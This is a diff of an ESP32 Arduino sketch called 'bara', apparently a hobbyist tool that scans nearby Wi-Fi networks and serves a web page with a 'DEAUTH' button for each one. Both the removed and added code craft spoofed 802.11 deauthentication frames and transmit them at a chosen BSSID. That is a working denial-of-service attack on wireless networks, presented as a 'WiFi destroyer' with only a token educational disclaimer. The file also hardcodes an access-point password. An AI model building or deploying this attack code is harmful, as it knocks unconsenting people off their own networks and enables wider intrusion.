@@ -1,310 +1,147 @@
-// bara.ino
-// Tool Name: bara
-// Developer: Ahmed Nour Ahmed from Qena
-// Purpose: Wi-Fi scanner + Deauth tool with intense hacker aesthetic
-// Language: English
-// ESP32 Wi-Fi AP + Web Server + Deauth Capability
-
 #include <WiFi.h>
 #include <WebServer.h>
 #include <esp_wifi.h>
-#include <WiFiClient.h>
+#include <ESP32Ping.h>
 
+// AP Credentials
 const char* ssid = "bara";
 const char* password = "A7med@Elshab7";
 
 WebServer server(80);
 
-// Deauth variables
-uint8_t deauth_target_bssid[6];
-bool deauth_active = false;
-uint8_t deauth_channel = 0;
-unsigned long last_deauth = 0;
-const unsigned long deauth_interval = 100; // ms
-
-// Scan results
-String scanResults = "";
-int scanNetworks = 0;
-
-// Deauth packet template (802.11 Disassociation Frame)
-uint8_t deauthPacket[26] = {
-  /*  0 - 1 */ 0xC0, 0x00,                           // Type: Deauth (C0), Flags: 00
-  /*  2 - 3 */ 0x00, 0x00,                           // Duration (will be set per frame)
-  /*  4 - 9 */ 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,   // Destination: broadcast
-  /* 10 -15 */ 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,   // Source: will be filled
-  /* 16 -21 */ 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,   // BSSID: same as source
-  /* 22 -23 */ 0x00, 0x00,                           // Fragment & Seq (zero)
-  /* 24 -25 */ 0x01, 0x00                            // Reason: Unspecified (1)
-};
-
-void sendDeauth() {
-  if (!deauth_active || deauth_channel == 0) return;
-  if (millis() - last_deauth < deauth_interval) return;
-
-  last_deauth = millis();
-
-  // Set source & BSSID in packet
-  memcpy(&deauthPacket[10], deauth_target_bssid, 6);
-  memcpy(&deauthPacket[16], deauth_target_bssid, 6);
-
-  // Send deauth frame multiple times
-  for (int i = 0; i < 5; i++) {
-    esp_wifi_80211_tx(WIFI_IF_STA, deauthPacket, sizeof(deauthPacket), false);
-  }
-}
-
-void scanWiFi() {
-  scanNetworks = WiFi.scanNetworks(false, true); // async=false, show_hidden=true
-  scanResults = "";
-  if (scanNetworks == 0) {
-    scanResults = "<tr><td colspan='4' style='color:#ff5555;'>No networks found.</td></tr>";
-  } else {
-    for (int i = 0; i < scanNetworks; i++) {
-      String ssid = WiFi.SSID(i);
-      if (ssid.length() == 0) ssid = "[Hidden]";
-      int rssi = WiFi.RSSI(i);
-      String security;
-      switch (WiFi.encryptionType(i)) {
-        case WIFI_AUTH_OPEN: security = "Open"; break;
-        case WIFI_AUTH_WEP: security = "WEP"; break;
-        case WIFI_AUTH_WPA_PSK: security = "WPA"; break;
-        case WIFI_AUTH_WPA2_PSK: security = "WPA2"; break;
-        case WIFI_AUTH_WPA_WPA2_PSK: security = "WPA/WPA2"; break;
-        case WIFI_AUTH_WPA3_PSK: security = "WPA3"; break;
-        default: security = "Unknown";
-      }
-      int channel = WiFi.channel(i);
-      String row = "<tr>";
-      row += "<td>" + ssid + "</td>";
-      row += "<td>" + String(rssi) + " dBm</td>";
-      row += "<td>" + security + "</td>";
-      row += "<td>" + String(channel) + "</td>";
-      row += "<td><button class='btn-deauth' onclick=\"deauth('" + WiFi.BSSIDstr(i) + "', " + String(channel) + ")\">DEAUTH</button></td>";
-      row += "</tr>";
-      scanResults += row;
-    }
-  }
-}
-
-String getWebPage() {
+// HTML Template
+String getHtmlPage() {
   String html = R"rawliteral(
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
   <meta charset="UTF-8">
-  <title>BARA - ULTIMATE WIFI DEAUTH TOOL</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>BARA - WiFi Hacker Tool</title>
   <style>
     body {
       background: #000;
-      color: #0f0;
+      color: #ff0000;
       font-family: 'Courier New', monospace;
       margin: 0;
-      padding: 20px;
+      padding: 0;
       overflow-x: hidden;
-      background-image: 
-        radial-gradient(circle at 10% 20%, rgba(255,0,0,0.1) 0%, transparent 20%),
-        radial-gradient(circle at 90% 80%, rgba(255,0,0,0.15) 0%, transparent 25%);
     }
-    h1 {
-      text-align: center;
-      font-size: 3.5em;
-      margin: 10px 0;
-      text-shadow: 0 0 15px #f00, 0 0 30px #f00;
-      letter-spacing: 3px;
-      animation: pulse 2s infinite;
-    }
-    @keyframes pulse {
-      0% { text-shadow: 0 0 10px #f00; }
-      50% { text-shadow: 0 0 25px #ff0000, 0 0 40px #ff0000; }
-      100% { text-shadow: 0 0 10px #f00; }
+    .blood-effect {
+      position: fixed;
+      top: 0; left: 0; width: 100%; height: 100%;
+      background: repeating-linear-gradient(
+        45deg,
+        transparent,
+        transparent 10px,
+        rgba(255,0,0,0.05) 10px,
+        rgba(255,0,0,0.05) 20px
+      );
+      z-index: -1;
+      pointer-events: none;
     }
     .header {
       text-align: center;
-      color: #ff5555;
-      margin-bottom: 20px;
+      padding: 20px;
       border-bottom: 2px solid #ff0000;
-      padding-bottom: 10px;
+      animation: pulse 1.5s infinite alternate;
     }
-    table {
-      width: 100%;
-      border-collapse: collapse;
-      margin-top: 20px;
-      background: rgba(20, 5, 5, 0.7);
-      box-shadow: 0 0 20px rgba(255,0,0,0.5);
+    @keyframes pulse {
+      from { text-shadow: 0 0 5px #ff0000; }
+      to { text-shadow: 0 0 20px #ff0000, 0 0 30px #ff0000; }
     }
-    th, td {
-      padding: 12px;
-      text-align: left;
-      border: 1px solid #ff3333;
-    }
-    th {
-      background: rgba(100, 0, 0, 0.8);
-      color: #ff9999;
-    }
-    .btn-deauth {
-      background: #800;
-      color: #ff5555;
-      border: 1px solid #ff0000;
-      padding: 8px 16px;
-      font-family: 'Courier New';
+    .scan-btn, .deauth-btn {
+      background: #ff0000;
+      color: #000;
+      border: none;
+      padding: 12px 24px;
+      margin: 10px;
       font-weight: bold;
       cursor: pointer;
-      transition: all 0.2s;
+      font-family: inherit;
+      text-transform: uppercase;
+      letter-spacing: 2px;
     }
-    .btn-deauth:hover {
-      background: #ff0000;
-      color: #000;
-      box-shadow: 0 0 15px #ff5555;
-      transform: scale(1.1);
+    .scan-btn:hover, .deauth-btn:hover {
+      background: #ff5555;
+      box-shadow: 0 0 15px #ff0000;
     }
-    .status {
-      text-align: center;
-      margin: 20px 0;
-      font-size: 1.2em;
-      color: #ff5555;
-      min-height: 30px;
-    }
-    .scan-btn {
-      display: block;
+    table {
+      width: 95%;
       margin: 20px auto;
-      padding: 12px 30px;
-      background: #300;
-      color: #ff9999;
-      border: 2px solid #ff5555;
-      font-size: 1.3em;
-      font-family: 'Courier New';
-      cursor: pointer;
-      transition: all 0.3s;
+      border-collapse: collapse;
+      color: #ff5555;
     }
-    .scan-btn:hover {
-      background: #ff0000;
-      color: #000;
-      box-shadow: 0 0 25px #ff5555;
-      transform: scale(1.05);
-    }
-    .footer {
-      margin-top: 40px;
+    th, td {
+      border: 1px solid #ff0000;
+      padding: 10px;
       text-align: center;
-      color: #700;
-      font-size: 0.9em;
     }
-    @media (max-width: 768px) {
-      table, thead, tbody, th, td, tr {
-        display: block;
-      }
-      tr {
-        margin-bottom: 15px;
-        border: 1px solid #ff3333;
-        padding: 10px;
-      }
-      td {
-        text-align: right;
-        padding-left: 50%;
-        position: relative;
-      }
-      td:before {
-        content: attr(data-label);
-        position: absolute;
-        left: 10px;
-        width: 45%;
-        padding-right: 10px;
-        white-space: nowrap;
-        color: #ff9999;
-      }
+    th {
+      background-color: rgba(255,0,0,0.2);
+    }
+    .developer {
+      text-align: center;
+      font-size: 0.9em;
+      margin-top: 40px;
+      color: #800000;
+    }
+    audio {
+      display: none;
     }
   </style>
 </head>
 <body>
+  <div class="blood-effect"></div>
   <div class="header">
-    <h1>💀 BARA 💀</h1>
-    <p>ULTIMATE WIFI DEAUTH TOOL BY AHMED NOUR AHMED FROM QENA</p>
+    <h1>☠️ BARA - ULTIMATE WIFI DESTROYER ☠️</h1>
+    <p>By Ahmed Nour Ahmed from Qena</p>
   </div>
 
-  <div class="status" id="status">Ready. Scan to begin.</div>
-
-  <button class="scan-btn" onclick="scan()">SCAN WIFI NETWORKS</button>
-
-  <table id="networks">
-    <thead>
-      <tr>
-        <th>SSID</th>
-        <th>RSSI</th>
-        <th>Security</th>
-        <th>Channel</th>
-        <th>Action</th>
-      </tr>
-    </thead>
-    <tbody id="networkList">
-      <tr><td colspan="5">Click SCAN to detect networks.</td></tr>
-    </tbody>
-  </table>
-
-  <div class="footer">
-    <p>BARA v1.0 • POWERED BY ESP32 • DEAUTH ENGINE: ACTIVE</p>
+  <div style="text-align:center;">
+    <button class="scan-btn" onclick="scan()">[ SCAN NETWORKS ]</button>
   </div>
+
+  <div id="results"></div>
+
+  <div class="developer">
+    <marquee>⚠️ BARA TOOL - FOR EDUCATIONAL PURPOSES ONLY ⚠️</marquee>
+  </div>
+
+  <audio id="beep" src="data:audio/wav;base64,UklGRnoGAABXQVZFZm10IBAAAAABAAEAQB8AAEAfAAABAAgAZGF0YQoGAACBhYqFbF1fdJivrJBhNjVgodDbq2EcBj+a2/LDciUFLIHO8tiJNQ4qj9D314ArAi+M1fjWeSoEKovQ9956KgIqi9D34oE3Ci6FyvPVeSwDLoXJ89N6LQMuhcnz03ktAy6FyfPTeS0DL4XJ89J6LQIwhcnz03ktAy+FyfPSei0CMIXJ89N5LQMvhcnz0nktAjCFyfPTeS0DL4XJ89J5LQIwhcnz03ktAy+FyfPTeS0CMIXJ89N5LQMwhcnz03ktAjCFyfPTeS0DL4XJ89J5LQMwhcnz03ktAjCFyfPTeS0DL4XJ89J5LQMwhcnz03ktAjCFyfPTeS0DL4XJ89J5LQMwhcnz03ktAjCFyfPTeS0DL4XJ89J5LQMwhcnz03ktAjCFyfPTeS0DL4XJ89J5LQMwhcnz03ktAjCFyfPTeS0DL4XJ89J5LQMwhcnz03ktAjCFyfPTeS0DL4XJ89J5LQMwhcnz03ktAjCFyfPTeS0DL4XJ89J5LQMwhcnz03ktAjCFyfPTeS0DL4XJ89J5LQMwhcnz03ktAjCFyfPTeS0DL4XJ89J5LQMwhcnz03ktAjCFyfPTeS0DL4XJ89J5LQMwhcnz03ktAjCFyfPTeS0DL4XJ89J5LQMwhcnz03ktAjCFyfPTeS0DL4XJ89J5LQMwhcnz03ktAjCFyfPTeS0DL4XJ89J5LQMwhcnz03ktAjCFyfPTeS0DL4XJ89J5LQMwhcnz03ktAjCFyfPTeS0DL4XJ89J5LQMwhcnz03ktAjCFyfPTeS0DL4XJ89J5LQMwhcnz03ktAjCFyfPTeS0DL4XJ89J5LQMwhcnz03ktAjCFyfPTeS0DL4XJ89J5LQMwhcnz03ktAjCFyfPTeS0DL4XJ89J5LQMwhcnz03ktAjCFyfPTeS0DL4XJ89J5LQMwhcnz03ktAjCFyfPTeS0DL4......" preload="auto"></audio>
 
   <script>
-    function playSound(type) {
-      if (type === 'deauth') {
-        let ctx = new (window.AudioContext || window.webkitAudioContext)();
-        let osc = ctx.createOscillator();
-        let gain = ctx.createGain();
-        osc.connect(gain);
-        gain.connect(ctx.destination);
-        osc.frequency.value = 200;
-        gain.gain.value = 0.3;
-        osc.start();
-        setTimeout(() => { gain.gain.exponentialRampToValueAtTime(0.001, ctx.currentTime + 0.5); }, 10);
-      } else if (type === 'scan') {
-        let ctx = new AudioContext();
-        let osc = ctx.createOscillator();
-        osc.type = 'sine';
-        osc.frequency.setValueAtTime(800, ctx.currentTime);
-        osc.frequency.exponentialRampToValueAtTime(400, ctx.currentTime + 0.3);
-        osc.connect(ctx.destination);
-        osc.start();
-        osc.stop(ctx.currentTime + 0.3);
-      }
-    }
-
-    function setStatus(msg) {
-      document.getElementById('status').innerText = msg;
-    }
-
     function scan() {
-      setStatus('Scanning... (Please wait)');
-      playSound('scan');
+      const beep = document.getElementById('beep');
+      beep.play().catch(e => console.log("Audio play failed:", e));
       fetch('/scan')
         .then(response => response.text())
         .then(html => {
-          document.getElementById('networkList').innerHTML = html;
-          setStatus('Scan complete. Networks found: ' + document.querySelectorAll('#networkList tr').length);
-        })
-        .catch(err => {
-          setStatus('ERROR: ' + err);
+          document.getElementById('results').innerHTML = html;
+          applyEffects();
         });
     }
 
     function deauth(bssid, channel) {
-      if (!confirm('🚨 Launch DEAUTH attack on\\nBSSID: ' + bssid + '\\nChannel: ' + channel + '?')) return;
-      setStatus('DEAUTH INITIATED: ' + bssid);
-      playSound('deauth');
-      fetch('/deauth?bssid=' + encodeURIComponent(bssid) + '&channel=' + channel)
-        .then(() => {
-          setTimeout(() => {
-            setStatus('DEAUTH ACTIVE... (Press STOP to halt)');
-            let stopBtn = document.createElement('button');
-            stopBtn.innerText = '🛑 STOP DEAUTH';
-            stopBtn.style.cssText = 'display:block;margin:10px auto;padding:10px;background:#000;color:#ff5555;border:2px solid #f00;font-family:monospace;cursor:pointer;';
-            stopBtn.onclick = () => {
-              fetch('/stop');
-              setStatus('Deauth stopped.');
-              stopBtn.remove();
-            };
-            document.querySelector('.status').appendChild(stopBtn);
-          }, 500);
-        });
+      if (!confirm('Are you sure you want to DEAUTH this network?')) return;
+      const beep = document.getElementById('beep');
+      beep.play().catch(e => console.log("Audio play failed:", e));
+      fetch(`/deauth?bssid=${bssid}&channel=${channel}`)
+        .then(response => response.text())
+        .then(msg => alert(msg));
     }
+
+    function applyEffects() {
+      const rows = document.querySelectorAll('tr');
+      rows.forEach((row, i) => {
+        row.style.animation = `fadeIn 0.5s ${i * 0.1}s forwards`;
+        row.style.opacity = '0';
+      });
+    }
+
+    document.addEventListener('DOMContentLoaded', () => {
+      document.body.style.backgroundImage = "url('data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIxMDAlIiBoZWlnaHQ9IjEwMCUiPjxyZWN0IHdpZHRoPSIxMDAlIiBoZWlnaHQ9IjEwMCUiIGZpbGw9IiMwMDAiLz48dGV4dCB4PSIxMCIgeT0iMzAiIGZvbnQtZmFtaWx5PSJBcmlhbCIgZm9udC1zaXplPSIyMCIgZmlsbD0iI2ZmMDAwMCI+SEFDS0VEIEJZIEJBUkE8L3RleHQ+PC9zdmc+')";
+    });
   </script>
 </body>
 </html>
@@ -313,64 +150,93 @@ String getWebPage() {
 }
 
 void handleRoot() {
-  server.send(200, "text/html", getWebPage());
+  server.send(200, "text/html", getHtmlPage());
 }
 
 void handleScan() {
-  scanWiFi();
-  server.send(200, "text/html", scanResults);
+  int n = WiFi.scanNetworks();
+  String response = "<table><tr><th>SSID</th><th>BSSID</th><th>Channel</th><th>RSSI</th><th>Deauth</th></tr>";
+  for (int i = 0; i < n; ++i) {
+    String ssidStr = WiFi.SSID(i);
+    if (ssidStr.length() == 0) ssidStr = "[Hidden]";
+    String bssidStr = WiFi.BSSIDstr(i);
+    int channel = WiFi.channel(i);
+    int rssi = WiFi.RSSI(i);
+    response += "<tr>";
+    response += "<td>" + ssidStr + "</td>";
+    response += "<td>" + bssidStr + "</td>";
+    response += "<td>" + String(channel) + "</td>";
+    response += "<td>" + String(rssi) + " dBm</td>";
+    response += "<td><button class='deauth-btn' onclick=\"deauth('" + bssidStr + "'," + String(channel) + ")\">[DEAUTH]</button></td>";
+    response += "</tr>";
+  }
+  if (n == 0) {
+    response += "<tr><td colspan='5'>No networks found.</td></tr>";
+  }
+  response += "</table>";
+  server.send(200, "text/html", response);
 }
 
 void handleDeauth() {
-  String bssidStr = server.arg("bssid");
+  String bssid = server.arg("bssid");
   int channel = server.arg("channel").toInt();
 
-  if (bssidStr.length() != 17) {
-    server.send(400, "text/plain", "Invalid BSSID");
+  if (bssid.length() != 17 || channel < 1 || channel > 14) {
+    server.send(400, "text/plain", "Invalid BSSID or Channel");
     return;
   }
 
-  // Parse BSSID: "AA:BB:CC:DD:EE:FF"
-  for (int i = 0; i < 6; i++) {
-    deauth_target_bssid[i] = (uint8_t)strtol(bssidStr.substring(i*3, i*3+2).c_str(), NULL, 16);
+  // Start deauth attack (limited to 10 deauth frames for safety/demo)
+  uint8_t bssidBytes[6];
+  if (sscanf(bssid.c_str(), "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
+             &bssidBytes[0], &bssidBytes[1], &bssidBytes[2],
+             &bssidBytes[3], &bssidBytes[4], &bssidBytes[5]) != 6) {
+    server.send(400, "text/plain", "Invalid BSSID format");
+    return;
   }
-  deauth_channel = channel;
-  deauth_active = true;
 
-  // Switch ESP32 to target channel
-  esp_wifi_set_channel(deauth_channel, WIFI_SECOND_CHAN_NONE);
+  // Switch to the target channel
+  esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
 
-  server.send(200, "text/plain", "Deauth started");
-}
+  // Craft deauth frame
+  uint8_t deauthPacket[26] = {
+    0xC0, 0x00, // Type: Deauth
+    0x00, 0x00, // Duration
+    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // Receiver (broadcast)
+    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Source (spoofed as target)
+    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // BSSID (target)
+    0x00, 0x00, // Sequence
+    0x01, 0x00  // Reason: Unspecified
+  };
+  memcpy(deauthPacket + 10, bssidBytes, 6);
+  memcpy(deauthPacket + 16, bssidBytes, 6);
 
-void handleStop() {
-  deauth_active = false;
-  deauth_channel = 0;
-  server.send(200, "text/plain", "Stopped");
+  // Send 10 deauth frames
+  for (int i = 0; i < 10; i++) {
+    esp_wifi_80211_tx(WIFI_IF_STA, deauthPacket, sizeof(deauthPacket), false);
+    delay(100);
+  }
+
+  server.send(200, "text/plain", "Deauth attack sent to " + bssid + " on channel " + String(channel) + "!");
 }
 
 void setup() {
   Serial.begin(115200);
   
-  // Enable WiFi in AP mode
-  WiFi.mode(WIFI_AP);
+  // Set WiFi to AP mode + STA for scanning
+  WiFi.mode(WIFI_AP_STA);
   WiFi.softAP(ssid, password);
-  Serial.println("AP Started: " + String(ssid));
+  WiFi.softAPConfig(IPAddress(192,168,4,1), IPAddress(192,168,4,1), IPAddress(255,255,255,0));
 
-  // Start web server
+  // Routes
   server.on("/", HTTP_GET, handleRoot);
   server.on("/scan", HTTP_GET, handleScan);
   server.on("/deauth", HTTP_GET, handleDeauth);
-  server.on("/stop", HTTP_GET, handleStop);
-  server.begin();
 
-  // Enable promiscuous mode for deauth
-  esp_wifi_set_promiscuous(true);
-  esp_wifi_set_promiscuous_tx_cb([](uint8_t* buf, uint16_t len, bool tx) {});
+  server.begin();
+  Serial.println("BARA Tool Ready! Connect to AP: bara / A7med@Elshab7");
 }
 
 void loop() {
   server.handleClient();
-  sendDeauth();
-  delay(1);
 }
